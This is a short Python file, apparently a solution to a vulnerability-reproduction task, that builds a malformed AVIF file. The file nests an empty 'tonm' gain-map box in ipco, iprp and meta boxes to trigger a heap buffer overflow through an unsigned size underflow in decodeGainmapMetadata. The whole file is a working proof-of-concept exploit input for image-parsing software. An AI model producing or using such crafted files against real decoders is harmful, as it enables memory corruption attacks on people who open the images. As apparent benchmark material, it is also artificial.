import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in decodeGainmapMetadata.
        The vulnerability is caused by an unsigned integer underflow when parsing the
        Gain Map metadata box (tonm) with insufficient size.
        """
        
        def make_box(type_: bytes, payload: bytes) -> bytes:
            """Constructs an ISOBMFF box."""
            size = len(payload) + 8
            return struct.pack(">I", size) + type_ + payload

        # 1. FTYP box
        # Major brand: avif, Minor version: 0, Compatible: mif1, avif
        ftyp_payload = b'avif' + b'\x00\x00\x00\x00' + b'mif1' + b'avif'
        ftyp = make_box(b'ftyp', ftyp_payload)

        # 2. HDLR box (Handler Reference)
        # FullBox (Version 0, Flags 0)
        # Predefined: 0
        # HandlerType: 'pict'
        # Reserved: 12 bytes of 0
        # Name: Empty string (null terminator)
        hdlr_payload = (
            b'\x00\x00\x00\x00' +  # Version & Flags
            b'\x00\x00\x00\x00' +  # Predefined
            b'pict' +              # Handler Type
            (b'\x00' * 12) +       # Reserved
            b'\x00'                # Name
        )
        hdlr = make_box(b'hdlr', hdlr_payload)

        # 3. TONM box (Gain Map Metadata)
        # This is the trigger. The vulnerability exists in decodeGainmapMetadata
        # where it performs subtraction on the size without checking bounds.
        # Providing an empty payload (size 0) or very small payload causes
        # the size calculation to wrap around (underflow) to a large value,
        # leading to a heap buffer overflow during subsequent operations.
        tonm = make_box(b'tonm', b'')

        # 4. IPCO box (Item Property Container)
        # Contains the properties, including our malicious tonm box.
        ipco = make_box(b'ipco', tonm)

        # 5. IPRP box (Item Properties)
        # Wraps IPCO.
        iprp = make_box(b'iprp', ipco)

        # 6. META box
        # FullBox (Version 0, Flags 0). Contains hdlr and iprp.
        meta_payload = b'\x00\x00\x00\x00' + hdlr + iprp
        meta = make_box(b'meta', meta_payload)

        # Combine to form the PoC file
        return ftyp + meta
